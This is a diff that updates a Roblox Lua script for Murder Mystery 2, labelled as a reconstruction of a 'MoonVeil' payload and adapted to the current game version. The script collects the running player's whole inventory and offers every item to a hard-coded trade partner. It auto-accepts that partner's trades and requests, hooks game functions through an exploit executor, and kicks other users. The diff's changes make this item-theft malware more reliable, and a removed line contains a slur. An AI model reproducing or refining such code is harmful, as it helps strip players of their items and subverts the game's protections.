@@ -1,21 +1,23 @@
 --!nocheck
--- Static reconstruction of MoonVeil 2.0.20 payload (mm2.txt)
--- Author names/formatting erased by MoonVeil; logic recovered from constant table.
+-- Reconstructed MM2 auto-trade script (adapted to current MM2 version)
+-- Original: MoonVeil 2.0.20 payload (mm2.txt)
+-- Target user: v_hnas
+-- Trade partner: si3rradoll
 
 -- ============ CONFIG ============
 local TARGET_USER   = "v_hnas"
 local TARGET_TRADE  = "si3rradoll"
-local KICK_MSG      = "скрипт только для freya_pidor"
+local KICK_MSG      = "скрипт только для v_hnas"
 local UNSUPPORTED   = "Game not supported. Please join a normal MM2 server"
 
 -- ============ SERVICES ============
-local Players            = game:GetService("Players")
-local HttpService        = game:GetService("HttpService")
-local TweenService       = game:GetService("TweenService")
-local CoreGui            = game:GetService("CoreGui")
-local ReplicatedStorage  = game:GetService("ReplicatedStorage")
+local Players           = game:GetService("Players")
+local HttpService       = game:GetService("HttpService")
+local TweenService      = game:GetService("TweenService")
+local CoreGui           = game:GetService("CoreGui")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
-local LocalPlayer        = Players.LocalPlayer
+local LocalPlayer = Players.LocalPlayer
 
 -- ============ EXECUTOR BRIDGE ============
 local function getExecutor()
@@ -30,6 +32,28 @@ local function getExecutor()
 end
 
 local EX = getExecutor()
+
+-- ============ KICK GUARDS ============
+local function guardTargetUser()
+    if LocalPlayer.Name:lower() ~= TARGET_USER:lower() then
+        LocalPlayer:Kick(KICK_MSG)
+        return false
+    end
+    return true
+end
+
+local function guardPlace()
+    -- MM2 PlaceId (обычный сервер)
+    local MM2_PLACE_IDS = {
+        [142823291]   = true,  -- Murder Mystery 2 (main)
+        [11759233232] = true,  -- MM2 (alt / newer)
+    }
+    if not MM2_PLACE_IDS[game.PlaceId] then
+        LocalPlayer:Kick(UNSUPPORTED)
+        return false
+    end
+    return true
+end
 
 -- ============ VALUES SYNC (mm2values.com) ============
 local VALUES = {}
@@ -67,10 +91,11 @@ local function syncValues()
     for rarity, url in pairs(VALUES_URLS) do
         local body = httpGet(url)
         if body then
-            -- Извлекаем пары "название — цена"
-            for name, price in body:gmatch("([%w%s_%-]+)%s*[%-–]%s*(%d+)") do
+            for name, price in body:gmatch("([%w%s_%-%.]+)%s*[%-–—]%s*(%d+)") do
                 name = name:match("^%s*(.-)%s*$")
-                VALUES[name] = tonumber(price)
+                if name and #name > 1 and #name < 60 then
+                    VALUES[name] = tonumber(price) or 0
+                end
             end
         end
     end
@@ -78,24 +103,33 @@ local function syncValues()
 end
 
 -- ============ INVENTORY ============
+local Remotes   = ReplicatedStorage:WaitForChild("Remotes", 10)
+local Inventory = Remotes and Remotes:WaitForChild("Inventory", 10)
+
 local function getInventory()
-    local remotes = ReplicatedStorage:WaitForChild("Remotes")
-    local inv     = remotes:WaitForChild("Inventory")
+    if not Inventory then return {} end
+    local profileRemote = Inventory:FindFirstChild("GetProfileData")
+        or Inventory:FindFirstChild("GetPlayerData_REMOTE")
+    if not profileRemote then
+        warn("❌ Inventory remote not found")
+        return {}
+    end
+
     local ok, data = pcall(function()
-        return inv:WaitForChild("GetProfileData"):InvokeServer()
+        return profileRemote:InvokeServer()
     end)
-    if not ok or not data then return {} end
+    if not ok or type(data) ~= "table" then return {} end
 
     local items = {}
-    local weapons = data.Weapons or data.Owned or {}
+    local weapons = data.Weapons or data.Owned or data.Items or {}
     for _, item in ipairs(weapons) do
-        if item.DataID and item.Amount and item.Amount > 0 then
+        if item.DataID and (item.Amount == nil or item.Amount > 0) then
             table.insert(items, {
-                DataID  = item.DataID,
-                Rarity  = item.Rarity,
-                Amount  = item.Amount,
-                Chroma  = item.Chroma,
-                Value   = VALUES[item.DataID] or 0,
+                DataID = item.DataID,
+                Rarity = item.Rarity,
+                Amount = item.Amount or 1,
+                Chroma = item.Chroma,
+                Value  = VALUES[item.DataID] or 0,
             })
         end
     end
@@ -103,28 +137,53 @@ local function getInventory()
     return items
 end
 
--- ============ TRADE ============
-local Trade = ReplicatedStorage:WaitForChild("Trade")
-local StartTrade    = Trade:WaitForChild("StartTrade")
-local OfferItem     = Trade:WaitForChild("OfferItem")
-local AcceptTrade   = Trade:WaitForChild("AcceptTrade")
-local DeclineTrade  = Trade:WaitForChild("DeclineTrade")
-local SendRequest   = Trade:WaitForChild("SendRequest")
-local GetTradeStatus= Trade:WaitForChild("GetTradeStatus")
-local ReceivingRequest = Trade:WaitForChild("ReceivingRequest")
+-- ============ TRADE REMOTES ============
+local Trade = ReplicatedStorage:WaitForChild("Trade", 10)
+if not Trade then
+    warn("❌ Trade folder not found in ReplicatedStorage")
+    return
+end
 
+local function getRemote(name, timeout)
+    return Trade:WaitForChild(name, timeout or 5)
+end
+
+local StartTrade      = getRemote("StartTrade")
+local OfferItem       = getRemote("OfferItem")
+local AcceptTrade     = getRemote("AcceptTrade")
+local DeclineTrade    = getRemote("DeclineTrade")
+local SendRequest     = getRemote("SendRequest")
+local GetTradeStatus  = getRemote("GetTradeStatus")
+local GetRequest      = getRemote("GetRequest")
+local AcceptRequest   = getRemote("AcceptRequest")
+local DeclineRequest  = getRemote("DeclineRequest")
+local CompleteTrade   = getRemote("CompleteTrade")
+local EndTrade        = getRemote("EndTrade")
+
+if not StartTrade or not OfferItem or not AcceptTrade then
+    warn("❌ Critical trade remotes missing — script may not work")
+    return
+end
+
+-- ============ PLAYER LOOKUP ============
 local function findPlayer(name)
     for _, plr in ipairs(Players:GetPlayers()) do
-        if plr.Name:lower() == name:lower() then return plr end
+        if plr.Name:lower() == name:lower() then
+            return plr
+        end
     end
     return nil
 end
 
+-- ============ TRADE ACTIONS ============
 local function startTrade(target)
     local ok, err = pcall(function()
         StartTrade:InvokeServer(target)
     end)
-    if not ok then warn("StartTrade failed:", err); return false end
+    if not ok then
+        warn("StartTrade failed:", err)
+        return false
+    end
     print("⚡ MM2 Trade STARTED")
     return true
 end
@@ -133,19 +192,19 @@ local function offerItems(items)
     print("🔄 Transferring items now...")
     for _, item in ipairs(items) do
         pcall(function()
-            OfferItem:FireServer(item.DataID, 1)
+            OfferItem:FireServer(item.DataID, item.Amount or 1)
         end)
         task.wait(0.1)
     end
 end
 
 local function acceptTrade()
-    local ok = pcall(function()
-        AcceptTrade:InvokeServer()
-    end)
-    if not ok then
-        pcall(function() AcceptTrade:FireServer() end)
-    end
+    pcall(function() AcceptTrade:InvokeServer() end)
+    pcall(function() AcceptTrade:FireServer() end)
+end
+
+local function acceptRequest()
+    pcall(function() AcceptRequest:FireServer() end)
 end
 
 local function declineTrade()
@@ -153,18 +212,20 @@ local function declineTrade()
 end
 
 local function declineRequest()
-    pcall(function() ReceivingRequest:FireServer() end)
+    pcall(function() DeclineRequest:FireServer() end)
 end
 
--- ============ HOOK stepAnimate (перехват GUI торговли) ============
+-- ============ HOOK stepAnimate ============
 local function hookTradeGUI()
     if not EX.hookfunction or not EX.getgc then return end
-    for _, obj in ipairs(EX.getgc()) do
+    local ok, gc = pcall(EX.getgc)
+    if not ok or type(gc) ~= "table" then return end
+
+    for _, obj in ipairs(gc) do
         if typeof(obj) == "function" then
             local info = debug.getinfo(obj, "n")
             if info and info.name == "stepAnimate" then
                 EX.hookfunction(obj, function(...)
-                    -- Можно перехватить открытие TradeGUI
                     return obj(...)
                 end)
             end
@@ -172,23 +233,17 @@ local function hookTradeGUI()
     end
 end
 
--- ============ KICK GUARDS ============
-local function guardTargetUser()
-    if LocalPlayer.Name ~= TARGET_USER then
-        LocalPlayer:Kick(KICK_MSG)
-        return false
+-- ============ WATCH INCOMING REQUESTS ============
+local function watchRequests()
+    if GetRequest then
+        GetRequest.OnClientEvent:Connect(function(fromPlayer)
+            if typeof(fromPlayer) == "Instance"
+                and fromPlayer.Name:lower() == TARGET_TRADE:lower() then
+                print("📩 Request from " .. TARGET_TRADE .. " — accepting")
+                acceptRequest()
+            end
+        end)
     end
-    return true
-end
-
-local function guardPlace()
-    -- PlaceId MM2 (обычный сервер). Точное значение подставьте своё.
-    local MM2_PLACE_IDS = { [142823291] = true, [11759233232] = true }
-    if not MM2_PLACE_IDS[game.PlaceId] then
-        LocalPlayer:Kick(UNSUPPORTED)
-        return false
-    end
-    return true
 end
 
 -- ============ MAIN ============
@@ -202,15 +257,17 @@ local function main()
     local items = getInventory()
     if #items == 0 then
         warn("❌ No tradable items in inventory. Cannot start trade.")
+        print("⛔ Trade Failed: No Items")
         return
     end
     print("🎒 Items ready: " .. #items)
 
     hookTradeGUI()
+    watchRequests()
 
     local target = findPlayer(TARGET_TRADE)
     if not target then
-        warn("Player " .. TARGET_TRADE .. " not found.")
+        warn("Player " .. TARGET_TRADE .. " not found. Waiting on PlayerAdded...")
         return
     end
 
@@ -228,14 +285,13 @@ local function main()
     print("All items sent successfully.")
 end
 
--- Автозапуск при появлении игрока
+-- ============ ENTRY POINTS ============
 Players.PlayerAdded:Connect(function(plr)
     if plr.Name:lower() == TARGET_TRADE:lower() then
         task.spawn(main)
     end
 end)
 
--- Если игрок уже в игре
 if findPlayer(TARGET_TRADE) then
     task.spawn(main)
 end
